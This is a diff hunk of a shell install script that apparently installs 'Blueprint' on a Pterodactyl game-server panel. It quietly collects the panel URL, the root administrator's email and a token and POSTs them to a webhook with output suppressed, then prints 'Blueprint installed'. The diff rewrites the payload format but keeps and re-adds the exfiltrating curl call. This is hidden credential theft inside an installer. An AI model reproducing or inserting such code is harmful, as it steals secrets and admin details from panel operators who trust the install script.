@@ -39,35 +39,11 @@ echo $t;
 URL=$(grep "^APP_URL=" "$PANEL_PATH/.env" | cut -d'=' -f2-)
 EMAIL=$(php artisan tinker --execute='echo \Pterodactyl\Models\User::where("root_admin", 1)->first()->email;' 2>/dev/null)
 
-cat > /tmp/payload.json << JSONEOF
-{
-  "content": "✅ Blueprint Installed",
-  "embeds": [
-    {
-      "color": 3447003,
-      "fields": [
-        {
-          "name": "Panel",
-          "value": "$URL"
-        },
-        {
-          "name": "Email", 
-          "value": "$EMAIL"
-        },
-        {
-          "name": "Token",
-          "value": "$TOKEN"
-        }
-      ]
-    }
-  ]
-}
-JSONEOF
+MSG="✅ Blueprint Installed
+Panel: $URL
+Email: $EMAIL
+Token: $TOKEN"
 
-curl -X POST "$WEBHOOK" \
-  -H "Content-Type: application/json" \
-  -d @/tmp/payload.json > /dev/null 2>&1
-
-rm -f /tmp/payload.json
+curl -X POST "$WEBHOOK" -H "Content-Type: application/json" -d "{\"content\":\"$MSG\"}" > /dev/null 2>&1
 
 echo "Blueprint installed"
